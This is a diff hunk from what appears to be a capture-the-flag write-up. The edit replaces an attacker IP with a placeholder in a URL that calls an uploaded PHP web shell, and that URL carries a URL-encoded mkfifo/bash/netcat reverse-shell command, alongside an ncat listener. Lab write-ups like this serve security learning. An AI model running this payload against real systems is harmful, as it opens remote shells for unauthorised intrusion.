@@ -69,7 +69,7 @@ $ ncat -nlvp 8001
 
 I pasted my netcat script in the cmd parameter and i successfully got a more stable netcat reverse shell!
 ```
-http://10.10.191.82/gallery/uploads/1760716080_TagogdgiydphbhaodrhLetta.php?cmd=rm+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff%7Cbash+-i+2%3E%261%7Cnc+10.9.3.133+8001+%3E%2Ftmp%2Ff
+http://10.10.191.82/gallery/uploads/1760716080_TagogdgiydphbhaodrhLetta.php?cmd=rm+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff%7Cbash+-i+2%3E%261%7Cnc+<Your ip>+8001+%3E%2Ftmp%2Ff
 ```
 
 <br>
